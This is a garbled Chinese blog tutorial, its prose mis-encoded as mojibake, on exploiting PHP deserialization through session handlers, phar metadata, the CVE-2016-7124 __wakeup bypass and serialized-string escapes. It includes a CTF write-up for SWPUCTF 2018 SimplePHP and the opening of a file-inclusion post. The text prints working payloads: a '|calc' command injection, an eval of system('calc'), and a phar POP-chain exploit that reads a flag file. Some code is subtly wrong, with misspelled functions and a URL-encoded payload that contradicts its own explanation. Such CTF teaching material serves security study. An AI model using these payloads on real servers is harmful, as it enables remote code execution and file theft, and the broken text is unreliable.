ï¼ˆ2ï¼‰ä¼šè¯è¿‡ç¨‹å½“å¼€å§‹ä¸€ä¸ªä¼šè¯æ—¶ï¼ŒPHPä¼šå°è¯•ä»è¯·æ±‚ä¸­æŸ¥æ‰¾ä¼šè¯IDï¼ˆé€šå¸¸é€šè¿‡ä¼šè¯cookieï¼‰ï¼Œå¦‚æœè¯·æ±‚ä¸­ä¸åŒ…æ‹¬ä¼šè¯IDä¿¡æ¯ï¼ŒPHPå°±ä¼šåˆ›å»ºä¸€ä¸ªæ–°çš„ä¼šè¯ã€‚ä¼šè¯å¼€å§‹ä¹‹åï¼ŒPHPå°±ä¼šå°†ä¼šè¯ä¸­çš„æ•°æ®è®¾ç½®åˆ°$_SESSIONå˜é‡ä¸­ã€‚å½“PHPåœæ­¢çš„æ—¶å€™ï¼Œå®ƒä¼šè‡ªåŠ¨è¯»å–$_SESSIONä¸­çš„å†…å®¹ï¼Œå¹¶å°†å…¶è¿›è¡Œåºåˆ—åŒ–ï¼Œç„¶åå‘é€ä¼šè¯ä¿å­˜ç®¡ç†å™¨æ¥è¿›è¡Œä¿å­˜ã€‚ é»˜è®¤æƒ…å†µä¸‹ï¼ŒPHPä½¿ç”¨å†…ç½®çš„æ–‡ä»¶ä¼šè¯ä¿å­˜ç®¡ç†å™¨ï¼ˆfilesï¼‰æ¥å®Œæˆä¼šè¯çš„ä¿å­˜ã€‚å¯ä»¥é€šè¿‡è°ƒç”¨å‡½æ•°session_start()æ¥æ‰‹åŠ¨å¼€å§‹ä¸€ä¸ªä¼šè¯ã€‚å¦‚æœé…ç½®é¡¹session.auto_startè®¾ç½®ä¸º1ï¼Œé‚£ä¹ˆè¯·æ±‚å¼€å§‹çš„æ—¶å€™ï¼Œä¼šè¯ä¼šè‡ªåŠ¨å¼€å§‹ PHPè„šæœ¬æ‰§è¡Œå®Œæ¯•ä¹‹åï¼Œä¼šè¯ä¼šè‡ªåŠ¨å…³é—­ã€‚åŒæ—¶ï¼Œä¹Ÿå¯ä»¥é€šè¿‡è°ƒç”¨å‡½æ•°session_write_close()æ¥æ‰‹åŠ¨å…³é—­ä¼šè¯ ï¼ˆ3ï¼‰å­˜å‚¨å¼•æ“PHPä¸­çš„sessionä¸­çš„å†…å®¹é»˜è®¤æ˜¯ä»¥æ–‡ä»¶çš„æ–¹å¼å‚¨å­˜ï¼Œå‚¨å­˜æ–¹å¼æ˜¯ç”±é…ç½®é¡¹session.save_handleræ¥è¿›è¡Œç¡®å®šçš„ï¼Œé»˜è®¤æ˜¯ä»¥æ–‡ä»¶çš„æ–¹å¼å‚¨å­˜ã€‚å‚¨å­˜çš„æ–‡ä»¶æ˜¯ä»¥sess_PHPSESSIDæ¥è¿›è¡Œå‘½åçš„ï¼Œæ–‡ä»¶çš„å†…å®¹å°±æ˜¯sessionå€¼å¾—åºåˆ—åŒ–ä¹‹åå¾—å†…å®¹ã€‚ session.serialize_handleræœ‰å¦‚ä¸‹ä¸‰ç§å–å€¼ï¼š &lt;?php error_reporting(0); in_set('session.serialize_handeler','php_binary');//è¿™é‡Œå¯ä»¥æ¢ä¸åŒçš„å­˜å‚¨å¼•æ“ session_start(); $_SESSION['username']=$_GET['username']; ?&gt; æ¯ç§å­˜å‚¨å¼•æ“å­˜å‚¨çš„å†…å®¹æ ¼å¼ï¼š 3.pharååºåˆ—åŒ–pharååºåˆ—åŒ–å°±æ˜¯å¯ä»¥åœ¨ä¸ä½¿ç”¨phpå‡½æ•°unserialize()çš„å‰æä¸‹ï¼Œè¿›è¡Œååºåˆ—åŒ–ï¼Œä»è€Œå¼•èµ·phpå¯¹è±¡æ³¨å…¥æ¼æ´ pharæ–‡ä»¶çš„ç»“æ„ï¼š -stubï¼špharæ–‡ä»¶æ ‡è¯†ï¼Œå‰é¢å†…å®¹ä¸é™ï¼Œä½†æ˜¯å¿…é¡»ä»¥__HALT_COMPILER();?&gt;æ¥ç»“å°¾ï¼Œå¦åˆ™pharæ‰©å±•å°†æ— æ³•è¯†åˆ«è¿™ä¸ªæ–‡ä»¶ä¸ºpharæ–‡ä»¶ -manifestï¼šå‹ç¼©æ–‡ä»¶çš„å±æ€§ç­‰ä¿¡æ¯ï¼Œä»¥åºåˆ—åŒ–çš„å½¢å¼å‚¨å­˜è‡ªå®šä¹‰çš„meat-dataï¼Œè¿™é‡Œå°±æ˜¯æ¼æ´åˆ©ç”¨çš„å…³é”®ç‚¹ -contentsï¼šå‹ç¼©æ–‡ä»¶çš„å†…å®¹ -signatureï¼šç­¾åï¼Œåœ¨æ–‡ä»¶æœ«å°¾ ç”Ÿæˆpharæ–‡ä»¶ ä¸€å®šè¦å°†php.iniä¸­çš„phar.readonlyé€‰é¡¹è®¾ç½®ä¸ºOff &lt;?php class h3{ } @unlink(\"phar.phar\"); $phar= new Phar(\"phar.phar\"); $phar-&gt;startBuffering(); $phar-&gt;setStub(\"GIF89a\".\"&lt;?php__HALT_COMPILER();?&gt;\");//è®¾ç½®stubï¼Œæ·»åŠ gifæ–‡ä»¶å¤´ $o=new h3(); $phar-&gt;setMetadata($o);//å°†è‡ªå®šä¹‰meat-dataå­˜å…¥manifest $phar-&gt;addFromString(\"test.txt\",\"test\");//æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶ $phar-&gt;stopBuffering(); ?&gt; ##äºŒã€ååºåˆ—åŒ–æ¼æ´ 1.ååºåˆ—åŒ–æˆå› ä¸»è¦æ˜¯ååºåˆ—åŒ–è¿‡ç¨‹ä¸­æŸäº›å‚æ•°å¯æ§ï¼Œä¼ å…¥æ„é€ çš„å­—ç¬¦ä¸²ï¼Œä»è€Œæ§åˆ¶å†…éƒ¨çš„å˜é‡è®¾ç½®å‡½æ•°ï¼Œæ‰§è¡Œæƒ³è¦çš„æ“ä½œ ï¼ˆ1ï¼‰pharååºåˆ—åŒ–æ¼æ´é€ æˆåŸå› æ¼æ´å‡ºå‘ç‚¹åœ¨ä½¿ç”¨phar://åè®®è¯»å–æ–‡ä»¶çš„æ—¶å€™ï¼Œæ–‡ä»¶å†…å®¹é»‘èƒŒè§£ææˆä¸ºpharå¯¹è±¡ï¼Œç„¶åpharå¯¹è±¡å†…çš„Meta-dataä¿¡æ¯ä¼šè¢«ååºåˆ—åŒ–ã€‚å½“å†…æ ¸è°ƒç”¨phar_parse_metadata()è§£æmet-adataæ•°æ®æ—¶ï¼Œä¼šè°ƒç”¨php_var_unserialize()å¯¹å…¶è¿›è¡Œååºåˆ—åŒ–æ“ä½œï¼Œå› æ­¤ä¼šé€ æˆæ¼æ´ 2.ååºåˆ—åŒ–æ¼æ´ï¼ˆ1ï¼‰PHPååºåˆ—åŒ–æ¼æ´&lt;?php highlight_string(file_get_contents('exam_day1.php')); class home { private $method; private $args; function __construct($method, $args) { $this-&gt;method = $method; $this-&gt;args = $args; } function __destruct() { // TODO: Implement __destruct() method. if (in_array($this-&gt;method, array(\"ping\"))) { call_user_func_array(array($this, $this-&gt;method), $this-&gt;args); } } function ping($host) { system(\"ping -C 2 $host\"); } function __wakeup() { $this-&gt;args = array(\"127.0.0.1\"); } } $a=@$_GET['a']; @unserialize($a); ?&gt; æˆ‘ä»¬å¯ä»¥ç®€å•çš„åˆ†æä¸€ä¸‹ä»£ç  å®šä¹‰äº†ä¸€ä¸ªclassç±»ï¼Œç±»ä¸­æœ‰ä¸¤ä¸ªç§æœ‰å˜é‡methodå’Œargs æœ‰ä¸‰ä¸ªé­”æœ¯æ–¹æ³•ï¼š function __construct($method, $args) //æ„é€ å‡½æ•°ï¼Œå½“å¯¹è±¡newçš„æ—¶å€™ä¼šè‡ªåŠ¨è°ƒç”¨ï¼Œä½†åœ¨unserialize()æ—¶ä¸ä¼šè‡ªåŠ¨è°ƒç”¨ { $this-&gt;method = $method; $this-&gt;args = $args; } function __destruct() //ææ„å‡½æ•°å½“å¯¹è±¡è¢«é”€æ¯æ—¶ä¼šè¢«è‡ªåŠ¨è°ƒç”¨ { // TODO: Implement __destruct() method. if (in_array($this-&gt;method, array(\"ping\"))) { call_user_func_array(array($this, $this-&gt;method), $this-&gt;args); } } function __wakeup() //unserialize()æ—¶ä¼šè¢«è‡ªåŠ¨è°ƒç”¨ { $this-&gt;args = array(\"127.0.0.1\"); } åˆ†æä»£ç æ®µä¸­hostçš„æ¥æºï¼Œæƒ³åŠæ³•åˆ©ç”¨system()æ„æˆRCE &lt;?php highlight_string(file_get_contents('exam_day1.php')); class home { private $method; private $args; function __construct($method, $args) //æ„é€ å‡½æ•°ï¼Œå½“å¯¹è±¡newçš„æ—¶å€™ä¼šè‡ªåŠ¨è°ƒç”¨ï¼Œä½†åœ¨unserialize()æ—¶ä¸ä¼šè‡ªåŠ¨è°ƒç”¨ { $this-&gt;method = $method; $this-&gt;args = $args; } function __destruct()//ææ„å‡½æ•°å½“å¯¹è±¡è¢«é”€æ¯æ—¶ä¼šè¢«è‡ªåŠ¨è°ƒç”¨ { // TODO: Implement __destruct() method. if (in_array($this-&gt;method, array(\"ping\"))) { call_user_func_array(array($this, $this-&gt;method), $this-&gt;args); } } function ping($host) { system(\"ping -C 2 $host\"); } function __wakeup() //unserialize()æ—¶ä¼šè¢«è‡ªåŠ¨è°ƒç”¨ { $this-&gt;args = array(\"127.0.0.1\"); } } $a=@$_GET['a']; @unserialize($a); ?&gt; æˆ‘ä»¬è§‚å¯Ÿä»£ç å¯çŸ¥ï¼š GETæ–¹æ³•è·å–å‚æ•°aï¼Œå¹¶ä¸”å°†å…¶ååºåˆ—åŒ–ã€‚ ä½†æ˜¯å†æ‰§è¡Œååºåˆ—åŒ–çš„æ—¶å€™ï¼Œä¼šè‡ªåŠ¨è°ƒç”¨__wakeup()é­”æœ¯æ–¹æ³•ï¼ŒæŠŠargsçš„å€¼æ”¹ä¸º127.0.0.1 æ— è®ºæˆ‘ä»¬æ€ä¹ˆæ„é€ payloadï¼Œsystem()æ‰§è¡Œçš„å‘½ä»¤éƒ½æ˜¯ping -c 2 127.0.0.1 è¿™æ—¶æˆ‘ä»¬å¯ä»¥åˆ©ç”¨åˆ°CVE-2016-7124æ¼æ´ é€‚ç”¨ç‰ˆæœ¬ï¼š PHP5&lt;5.6.25ã€PHP7&lt;7.0.1 å½“æˆå‘˜å±æ€§æ•°ç›®å¤§äºå®é™…æ•°ç æ—¶å¯ç»•è¿‡__wakeupæ–¹æ³• å°±å¯ä»¥æ„é€ æ¶æ„payloadæ¥RCE è¿™é‡Œè¿˜æœ‰ä¸ªå°çŸ¥è¯†ç‚¹|ç®¡é“ç¬¦ æŠŠä¸€ä¸ªå‘½ä»¤çš„æ ‡å‡†è¾“å‡ºä¼ é€åˆ°å¦ä¸€ä¸ªå‘½ä»¤çš„æ ‡å‡†è¾“å…¥ä¸­ï¼Œè¿ç»­çš„|æ„å‘³ç€ç¬¬ä¸€ä¸ªå‘½ä»¤çš„è¾“å‡ºä¸ºç¬¬äºŒä¸ªå‘½ä»¤çš„è¾“å…¥ï¼Œç¬¬äºŒä¸ªå‘½ä»¤çš„è¾“å…¥ä¸ºç¬¬ä¸€ä¸ªå‘½ä»¤çš„è¾“å‡ºã€‚ æ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ„é€ åºåˆ—åŒ–äº† &lt;?php class home{ private $method=\"ping\"; private $args=array(\"|calc\"); } serialize(new home()); O:4:\"home\":2:{s:12:\" home method\";s:4:\"ping\";s:10:\" home args\";a:1:{i:0;s:7:\"|calc\";}} éœ€è¦è·³ä¸€ä¸‹__wakeup()æŠŠæˆå‘˜å±æ€§æ•°ç›®æ”¹ä¸º3 O:4:\"home\":3:{s:12:\" home method\";s:4:\"ping\";s:10:\" home args\";a:1:{i:0;s:7:\"|calc\";}} URLç¼–ç ä¸€ä¸‹ O%3A4%3A%22home%22%3A2%3A%7Bs%3A12%3A%22%00home%00method%22%3Bs%3A4%3A%22ping%22%3Bs%3A10%3A%22%00home%00args%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A5%3A%22%7Ccalc%22%3B%7D%7D æˆåŠŸRCE ï¼ˆ2ï¼‰sessionååºåˆ—åŒ–æ¼æ´å½“ç½‘ç«™åºåˆ—åŒ–å­˜å‚¨sessionä¸ååºåˆ—åŒ–è¯»å–sessionæ–¹å¼ä¸åŒæ—¶ï¼Œå°±å¯èƒ½å¯¼è‡´sessionååºåˆ—åŒ–æ¼æ´çš„äº§ç”Ÿã€‚ä¸€èˆ¬éƒ½æ˜¯ä»¥php_serializeåºåˆ—åŒ–å­˜å‚¨sessionï¼Œä»¥PHPååºåˆ—åŒ–è¯»å–sessionï¼Œé€ æˆååºåˆ—åŒ–æ”»å‡» ä¾‹å­ï¼š phpinfoï¼š s1.phpï¼š &lt;?php highlight_file(__FILE__); error_reporting(0); ini_set(\"session.serialize_handler\",'php_serialize'); session_start(); $_SESSION[\"h3\"]=$_GET[\"u\"]; ?&gt; s2.phpï¼š &lt;?php highlight_file(__FILE__); session_start(); class session{ var $var; function __destruct(){ eval($this-&gt;var); } } ?&gt; è¿™é‡Œéœ€è¦è¯´ä¸€ä¸‹unserializeçš„ç‰¹æ€§ï¼Œåœ¨æ‰§è¡Œunserializeçš„æ—¶å€™ï¼Œå¦‚æœå­—ç¬¦ä¸²å‰é¢æ»¡è¶³äº†å¯è¢«åºåˆ—åŒ–çš„è§„åˆ™ï¼Œåˆ™åå­¦çš„å­—ç¬¦å°±ä¼šè¢«å¿½ç•¥ a:1:{s:2:\"h3\";s:52:\"|O:7:\"session\":1:{s:3:\"var\";s:15:\"system('calc');\";}\";} expï¼š &lt;?php class session{ var $var=\"system('calc');\"; } echo \"|\".serialize(new session()); æ‰§è¡Œç»“æœ: ä¸Šæ–‡å¯ä»¥ç»™$_SESSIONèµ‹å€¼ï¼Œè‹¥ä»£ç ä¸­ä¸å­˜åœ¨ç»™$_SESSIONèµ‹å€¼å¯ä»¥åˆ©ç”¨uplode_processæœºåˆ¶ï¼Œå¯ä»¥åœ¨$_SESSIONä¸­åˆ›å»ºä¸€ä¸ªé”®å€¼å¯¹ï¼Œå…¶ä¸­çš„å€¼å¯ä»¥æ§åˆ¶ &lt;?php $key=ini_get(\"session.upload_progress.prefix\") . ini_get(\"session.upload_progress.name\"); var_dump($_SESSION[$key]); ?&gt; ï¼ˆ3ï¼‰pharååºåˆ—åŒ–åˆ©ç”¨æ¡ä»¶ï¼š -pharæ–‡ä»¶èƒ½å¤Ÿä¸Šä¼ åˆ°æœåŠ¡å™¨ -è¦æœ‰å¯ç”¨çš„é­”æœ¯æ–¹æ³•ä½œä¸ºâ€œè·³æ¿â€ -æ–‡ä»¶æ“ä½œå‡½æ•°çš„å‚æ•°å¯æ§ï¼Œä¸”ï¼š/ \\ ç­‰ç‰¹æ®Šå­—ç¬¦æ²¡æœ‰è¢«è¿‡æ»¤ æœ‰åºåˆ—åŒ–æ•°æ®å¿…ç„¶ä¼šæœ‰ååºåˆ—åŒ–æ“ä½œï¼Œphpä¸€å¤§éƒ¨åˆ†çš„æ–‡ä»¶ç³»ç»Ÿå‡½æ•°åœ¨é€šè¿‡phar://ä¼ªåè®®è§£æpharæ–‡ä»¶æ—¶ï¼Œéƒ½ä¼šå°†meta-dataè¿›è¡Œååºåˆ—åŒ–ï¼Œå—å½±å“çš„å‡½æ•°å¦‚ä¸‹ ä¾‹é¢˜:[SWPUCTF 2018]SimplePHP å­˜åœ¨ä»»æ„æ–‡ä»¶è¯»å– å…ˆæ¥è¯»å–ä¸€ä¸‹upload_file.php &lt;?php include 'function.php'; upload_file(); ?&gt; å†æ¥è¯»å–ä¸€ä¸‹function.php &lt;?php //show_source(__FILE__); include \"base.php\"; header(\"Content-type: text/html;charset=utf-8\"); error_reporting(0); function upload_file_do() { global $_FILES; $filename = md5($_FILES[\"file\"][\"name\"].$_SERVER[\"REMOTE_ADDR\"]).\".jpg\"; //mkdir(\"upload\",0777); if(file_exists(\"upload/\" . $filename)) { unlink($filename); } move_uploaded_file($_FILES[\"file\"][\"tmp_name\"],\"upload/\" . $filename); echo '&lt;script type=\"text/javascript\"&gt;alert(\"ä¸Šä¼ æˆåŠŸ!\");&lt;/script&gt;'; } function upload_file() { global $_FILES; if(upload_file_check()) { upload_file_do(); } } function upload_file_check() { global $_FILES; $allowed_types = array(\"gif\",\"jpeg\",\"jpg\",\"png\"); $temp = explode(\".\",$_FILES[\"file\"][\"name\"]); $extension = end($temp); if(empty($extension)) { //echo \"&lt;h4&gt;è¯·é€‰æ‹©ä¸Šä¼ çš„æ–‡ä»¶:\" . \"&lt;h4/&gt;\"; } else{ if(in_array($extension,$allowed_types)) { return true; } else { echo '&lt;script type=\"text/javascript\"&gt;alert(\"Invalid file!\");&lt;/script&gt;'; return false; } } } ?&gt; å†è¯»å–ä¸€ä¸‹base.php å‘ç°äº†æç¤º å›å¤´å†æ¥çœ‹class.php &lt;?php class C1e4r { public $test; public $str; public function __construct($name) { $this-&gt;str = $name; } public function __destruct() { $this-&gt;test = $this-&gt;str; echo $this-&gt;test; } } class Show { public $source; public $str; public function __construct($file) { $this-&gt;source = $file; //$this-&gt;source = phar://phar.jpg echo $this-&gt;source; } public function __toString() { $content = $this-&gt;str['str']-&gt;source; return $content; } public function __set($key,$value) { $this-&gt;$key = $value; } public function _show() { if(preg_match('/http|https|file:|gopher|dict|\\.\\.|f1ag/i',$this-&gt;source)) { die('hacker!'); } else { highlight_file($this-&gt;source); } } public function __wakeup() { if(preg_match(\"/http|https|file:|gopher|dict|\\.\\./i\", $this-&gt;source)) { echo \"hacker~\"; $this-&gt;source = \"index.php\"; } } } class Test { public $file; public $params; public function __construct() { $this-&gt;params = array(); } public function __get($key) { return $this-&gt;get($key); } public function get($key) { if(isset($this-&gt;params[$key])) { $value = $this-&gt;params[$key]; } else { $value = \"index.php\"; } return $this-&gt;file_get($value); } public function file_get($value) { $text = base64_encode(file_get_contents($value)); return $text; } } ?&gt; åœ¨Testç±»ä¸­å­˜åœ¨æ•æ„Ÿæ“ä½œ public function file_get($value) { $text = base64_encode(file_get_contents($value)); return $text; } å¯ä»¥åå‘æ¨pocé“¾ é€šè¿‡file_get_contentæ¥è¯»å–æˆ‘ä»¬æƒ³è¦çš„æ–‡ä»¶ï¼Œä¹Ÿå°±æ˜¯è°ƒç”¨file_getå‡½æ•°ï¼Œä¹‹å‰åˆ†æå¾—çŸ¥__get-&gt;get-&gt;file_getï¼Œæ‰€ä»¥å…³é”®æ˜¯è§¦å‘__getæ–¹æ³•ï¼Œé‚£ä¹ˆå°±è¦å¤–éƒ¨è®¿é—®ä¸€ä¸ªTestç±»æ²¡æœ‰æˆ–ä¸å¯è®¿é—®çš„å±æ€§ï¼Œæˆ‘ä»¬æ³¨æ„åˆ°å‰é¢Showç±»çš„__tostringæ–¹æ³• class Show { public $source; public $str; public function __construct($file) { $this-&gt;source = $file; //$this-&gt;source = phar://phar.jpg echo $this-&gt;source; } public function __toString() { $content = $this-&gt;str['str']-&gt;source; return $content; } public function __set($key,$value) { $this-&gt;$key = $value; } public function _show() { if(preg_match('/http|https|file:|gopher|dict|\\.\\.|f1ag/i',$this-&gt;source)) { die('hacker!'); } else { highlight_file($this-&gt;source); } } public function __wakeup() { if(preg_match(\"/http|https|file:|gopher|dict|\\.\\./i\", $this-&gt;source)) { echo \"hacker~\"; $this-&gt;source = \"index.php\"; } } } public function __toString() //æŠŠç±»å½“ä½œå­—ç¬¦ä¸²ä½¿ç”¨æ—¶è§¦å‘ { $content = $this-&gt;str['str']-&gt;source; return $content; } æŸ¥çœ‹ä¸€ä¸‹æ€ä¹ˆèƒ½å¤Ÿè§¦å‘__toString()æ–¹æ³• public function __destruct() { $this-&gt;test = $this-&gt;str; echo $this-&gt;test; } çŸ¥è¦echo testå³å¯ æ•´æ¡é“¾å­ä¸º C1e4r::destruct() -&gt; Show::toString() -&gt; Test::__get() expå¦‚ä¸‹ &lt;?php class C1e4r { public $test; public $str; } class Show { public $source; public $str; } class Test { public $file; public $params; } $a= new C1e4r(); $b= new Show(); $c= new Test(); $c-&gt;params['source'] = \"/var/www/html/f1ag.php\"; $a-&gt;str = $b; $b-&gt;str['str'] = $c; $phar = new Phar(\"exp.phar\"); //ç”Ÿæˆpharæ–‡ä»¶ $phar-&gt;startBuffering(); $phar-&gt;setStub('&lt;?php __HALT_COMPILER(); ? &gt;'); $phar-&gt;setMetadata($a); //è§¦å‘å¤´æ˜¯C1e4rç±» $phar-&gt;addFromString(\"exp.txt\", \"test\"); //ç”Ÿæˆç­¾å $phar-&gt;stopBuffering(); ?&gt; ä¿®æ”¹ç”Ÿæˆå¾—pharæ–‡ä»¶åç¼€ ä¸Šä¼ æˆåŠŸåå›åˆ°æ–‡ä»¶è¯»å–ç‚¹æ¥è¯»pharæ–‡ä»¶ æ‹¿åˆ°base64åŠ å¯†å¾—flag ååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸ä¸€ã€æ¦‚å¿µåœ¨ååºåˆ—åŒ–å‰ï¼Œå¯¹åºåˆ—åŒ–åçš„å­—ç¬¦ä¸²è¿›è¡Œæ›¿æ¢æˆ–è€…ä¿®æ”¹ï¼Œä½¿å¾—å­—ç¬¦ä¸²çš„é•¿åº¦å‘ç”Ÿäº†å˜åŒ–ï¼Œé€šè¿‡æ„é€ ç‰¹å®šçš„å­—ç¬¦ä¸²ï¼Œå¯¼è‡´å¯¹è±¡æ³¨å…¥ç­‰æ¶æ„æ“ä½œã€‚ äºŒã€å­—ç¬¦å˜å¤šä¾‹å­ï¼š è¯¥é¢˜æºç å¦‚ä¸‹ &lt;?php include 'flag.php'; function filter($string){ return str_replace('x','yy',$string); } $username=$_GET['u']; $password=\"aaa\"; $user=array($username,$password); $s=serialize($user); $r=filter($s); echo $r; $a= unserialize($r); if ($a[1]==='admin'){ echo $flag; } highlight_file(__FILE__); ?&gt; æ–‡ä»¶åŒ…å«äº†flag ç„¶åfilter()æ–¹æ³•ï¼Œä¼šå°†åºåˆ—åŒ–å­—ç¬¦ä¸²ä¸­çš„xæ›¿æ¢ä¸ºyyï¼Œå¯èƒ½ä¼šå¯¼è‡´å­—ç¬¦ä¸²é•¿åº¦ æˆ‘ä»¬è¯•ç€ä¼ å…¥u=admin åºåˆ—åŒ–ä¸ºï¼š a:2:{i:0;s:5:\\\"admin\\\";i:1;s:3:\\\"aaa\\\";} ååºåˆ—åŒ–å a[1]ä¸ç­‰äºâ€adminâ€ æ²¡æœ‰æ»¡è¶³æ¡ä»¶ æˆ‘ä»¬æ„é€ ä¸€ä¸‹æ•°ç»„ &lt;?php $a= array('a',\"admin\"); echo serialize($a); a:2:{i:0;s:1:\"a\";i:1;s:5:\"admin\";} ä½†æ˜¯æˆ‘ä»¬åªæœ‰ä¸€ä¸ªå‚æ•°usernameå¯æ§ å¯ä»¥åˆ©ç”¨å­—ç¬¦ä¸²é€ƒé€¸ å¤åˆ¶è‡ªå·±æƒ³è¦æ„é€ çš„å­—ç¬¦ä¸² \";i:1;s:5:\"admin\";} æŒ‰ç…§é•¿åº¦æ·»åŠ å­—ç¬¦ä¸²ï¼Œå·²çŸ¥é•¿åº¦ä¸º19 åˆ™åœ¨å‰æ–¹å¡«å……19ä¸ªx 'xxxxxxxxxxxxxxxxxxx\";i:1;s:5:\"admin\";} æµ‹è¯•ä¸€ä¸‹ &lt;?php $a= array('xxxxxxxxxxxxxxxxxxx\";i:1;s:5:\"admin\";}',\"a\"); $s= serialize($a); $v = str_replace('x','yy',$s); echo $v; è¿è¡Œç»“æœ a:2:{i:0;s:38:\"yyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy\";i:1;s:5:\"admin\";}\";i:1;s:1:\"a\";} å¯ä»¥çœ‹åˆ°å·²ç»é€ƒé€¸å‡ºæ¥äº† è¿™é‡Œåˆ©ç”¨äº†åºåˆ—åŒ–çš„ç‰¹æ€§ ååºåˆ—åŒ–çœ‹ä¸€ä¸‹ array(2) { [0] =&gt; string(38) \"yyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy\" [1] =&gt; string(5) \"admin\" } å¯ä»¥è§‚å¯Ÿæ•´ä¸ªæ•°æ®çš„å˜åŒ– æˆåŠŸé€ƒé€¸ã€‚è·å¾—flag ä¸‰ã€å­—ç¬¦å˜å°‘ä¹Ÿæ˜¯æ‹¿ä¸€é“é¢˜åšä¾‹å­ &lt;?php error_reporting(0); include 'flag.php'; function filter($string){ return str_replace('sec','',$string); } $username=$_GET['u']; $password=$_GET['p']; $auth=\"guest\"; $user=array($username,$password); $s=serialize($user); $r=filter($s); $a=unserialize($r); if($a[2]==='admin'){ echo flag; } highlight_file(__FILE__); ?&gt; è·Ÿä¸Šä¸€é“é¢˜å·®ä¸å¤š å…ˆéšæ„æ„é€ ä¸€ä¸‹äº‰å–çš„payloadï¼š &lt;?php $a= array(\"u\",\"p\",\"admin\"); $s= serialize($a); echo $s; $v = str_replace('sec','',$s); è¿è¡Œåæ‹¿åˆ°æ‰€éœ€éƒ¨åˆ† \";i:2;s:5:\"admin\";} éœ€è¦æˆ‘ä»¬ä¼ å…¥çš„payload u=xxx&amp;p=xxxx å·²çŸ¥ä¸¤ä¸ªå¯æ§å€¼ä¸­é—´çš„éƒ¨åˆ†ä¸å˜ï¼ˆå¯èƒ½ä¼šå¤šä¸€ä½ï¼‰ \";i:1;s:1:\" è¿™é‡Œå¯ä»¥åˆ©ç”¨æ›¿æ¢æ–¹æ³•æ¢æˆç©ºå€¼ä»è€Œå®Œæˆé€ƒé€¸ &lt;?php $a= array(\"secsecsecsec\",'\";i:1;s:1:\"p\";i:2;s:5:\"admin\";}',\"admin\"); $s= serialize($a); echo $s; $v = str_replace('sec','',$s); æ‰§è¡Œç»“æœ a:3:{i:0;s:12:\"secsecsecsec\";i:1;s:31:\"\";i:1;s:1:\"p\";i:2;s:5:\"admin\";}\";i:2;s:5:\"admin\";} å¯ä»¥çœ‹åˆ°å·²ç»å®Œæˆäº†é€ƒé€¸ ååºåˆ—åŒ–ä¸€ä¸‹çœ‹çœ‹ array(3) { [0] =&gt; string(12) \"\";i:1;s:31:\"\" [1] =&gt; string(1) \"p\" [2] =&gt; string(5) \"admin\" } a[2]=admin æ‹¿åˆ°flag","categories":[{"name":"å­¦ä¹ ","slug":"å­¦ä¹ ","permalink":"http://h3geeker.top/categories/%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"ç½‘ç»œå®‰å…¨","slug":"ç½‘ç»œå®‰å…¨","permalink":"http://h3geeker.top/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"PHPæ–‡ä»¶åŒ…å«æ¼æ´åŸºç¡€","slug":"PHPæ–‡ä»¶åŒ…å«æ¼æ´åŸºç¡€","date":"2021-11-10T13:35:22.000Z","updated":"2021-11-11T03:48:24.163Z","comments":true,"path":"posts/f4224d8e.html","link":"","permalink":"http://h3geeker.top/posts/f4224d8e.html","excerpt":"","text":"ä¸€ã€æ–‡ä»¶åŒ…å«æ¼æ´æ–‡ä»¶åŒ…å«ä¸»è¦æ˜¯ä¸ºäº†æ›´å¥½åœ°ä½¿ç”¨ä»£ç çš„é‡ç”¨æ€§ï¼Œå¼•å…¥äº†æ–‡ä»¶åŒ…å«å‡½æ•°ï¼Œé€šè¿‡æ–‡ä»¶åŒ…å«å‡½æ•°å°†æ–‡ä»¶åŒ…å«è¿›æ¥ï¼Œç›´æ¥ä½¿ç”¨åŒ…å«æ–‡ä»¶çš„ä»£ç ï¼Œç®€å•ç‚¹æ¥è¯´å°±æ˜¯ä¸€ä¸ªæ–‡ä»¶é‡Œé¢åŒ…å«å¦å¤–ä¸€ä¸ªæˆ–å¤šä¸ªæ–‡ä»¶ã€‚ äºŒã€æ¼æ´äº§ç”ŸåŸå› æœåŠ¡å™¨åœ¨æ‰§è¡ŒPHPæ–‡ä»¶çš„æ—¶å€™ï¼Œç”¨æˆ·å¯æ§æ–‡ä»¶çš„å‚æ•°ï¼Œå¹¶ä¸”æ²¡æœ‰ä¸¥æ ¼çš„æ£€éªŒå’Œè¿‡æ»¤ï¼Œæˆ–è€…è¢«Bypassï¼Œæ“ä½œä¸€äº›æ•æ„Ÿæ–‡ä»¶æ¥å¯¼è‡´æ–‡ä»¶æ³„éœ²å’Œæ¶æ„ä»£ç æ³¨å…¥ç­‰å±å®³ ä¸¾ä¸€ä¸ªç®€å•çš„ä¾‹å­ &lt;?php $filename = $_GET['page']; include($filename); ?&gt; è¿™é‡Œçš„filenameå‚æ•°æ²¡æœ‰ç»è¿‡è¿‡æ»¤ï¼Œç›´æ¥èµ‹å€¼ç»™include()å‡½æ•°ï¼Œæˆ‘ä»¬å°±å¯ä»¥ä¿®æ”¹filennameçš„å€¼ï¼Œæ‰§è¡Œå…¶ä»–æ“ä½œ æˆ‘ä»¬åœ¨åŒç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªinfo.txt å†…å®¹å¦‚ä¸‹ è¿™æ ·æˆ‘ä»¬åªéœ€è¦æŠŠinfo.txtåŒ…å«è¿›å»å³å¯è§£æ ä¸‰ã€PHPå¸¸ç”¨çš„åŒ…å«å‡½æ•°åœ¨phpä¸­ï¼Œå¸¸ç”¨çš„ä¸ºä»¥ä¸‹4ä¸ªå‡½æ•° include() include_once() require() require_once() 